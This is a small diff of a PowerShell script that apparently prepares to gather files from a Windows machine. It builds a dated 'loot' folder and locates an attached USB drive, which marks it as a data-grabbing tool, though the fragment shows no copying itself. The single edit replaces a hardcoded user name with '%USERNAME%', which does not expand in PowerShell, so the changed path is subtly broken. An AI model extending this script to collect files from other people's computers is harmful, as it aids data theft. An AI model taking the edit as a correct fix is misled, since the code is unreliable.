@@ -3,7 +3,7 @@
 #import date
 $todaysDate = Get-Date -format yyyyMMdd
 #define folder for loot
-$destinationFolder = "C:\Users\Sparda\Documents\loot\$todaysDate"
+$destinationFolder = "C:\Users\%USERNAME%\Documents\loot\$todaysDate"
 #define external device
 $mydrive=(GWmi Win32_LogicalDisk | ?{$_.interfacetype -eq "USB"})
 #create storage location
